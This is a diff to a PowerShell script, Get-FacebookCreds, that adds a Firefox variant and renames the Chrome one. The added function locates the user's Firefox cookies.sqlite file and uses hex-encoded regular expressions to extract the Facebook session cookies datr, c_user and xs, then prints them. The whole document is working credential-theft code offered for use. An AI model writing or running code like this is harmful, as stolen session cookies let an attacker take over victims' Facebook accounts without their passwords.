@@ -4,7 +4,54 @@
 # Use: Get-FacebookCreds [path to Login Data]
 # Path is optional, use if automatic search doesn't work
 
-function Get-FacebookCreds() {
+function Get-FacebookCreds-Firefox() {
+	Param(
+		[String]$Path
+	)
+
+	if ([String]::IsNullOrEmpty($Path)) {
+        # $Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies"
+		$path = Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\cookies.sqlite"
+	}
+
+	if (![system.io.file]::Exists($Path))
+	{
+		Write-Error 'Chrome db file doesnt exist, or invalid file path specified.'
+		Break
+	}
+
+	Add-Type -AssemblyName System.Security
+	# Credit to Matt Graber for his technique on using regular expressions to search for binary data
+	$Stream = New-Object IO.FileStream -ArgumentList "$Path", 'Open', 'Read', 'ReadWrite'
+	$Encoding = [system.Text.Encoding]::GetEncoding(28591)
+	$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
+	$BinaryText = $StreamReader.ReadToEnd()
+	$StreamReader.Close()
+	$Stream.Close()
+
+	# First the magic bytes for the facebook string, datr size is 24
+	$PwdRegex = [Regex] '\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x64\x61\x74\x72([\s\S]{24})'
+	$PwdMatches = $PwdRegex.Matches($BinaryText)
+	$datr = $PwdMatches.groups[1]
+
+	"datr is $datr"
+
+	# First the magic bytes for the facebook string, c_user size is 15
+	$PwdRegex = [Regex] '\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x63\x5F\x75\x73\x65\x72([\s\S]{15})'
+	$PwdMatches = $PwdRegex.Matches($BinaryText)
+	$c_user = $PwdMatches.groups[1]
+
+	"c_user is $c_user"
+
+	# First the magic bytes for the facebook string, xs size is 44
+	$PwdRegex = [Regex] '\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x78\x73([\s\S]{44})'
+	$PwdMatches = $PwdRegex.Matches($BinaryText)
+	$xs = $PwdMatches.groups[1]
+
+	"xs is $xs"
+}
+
+function Get-FacebookCreds-Chrome() {
 	Param(
 		[String]$Path
 	)
@@ -61,5 +108,3 @@ function Get-FacebookCreds() {
 
 	"xs is $DecPwd"
 }
-
-Get-FacebookCreds
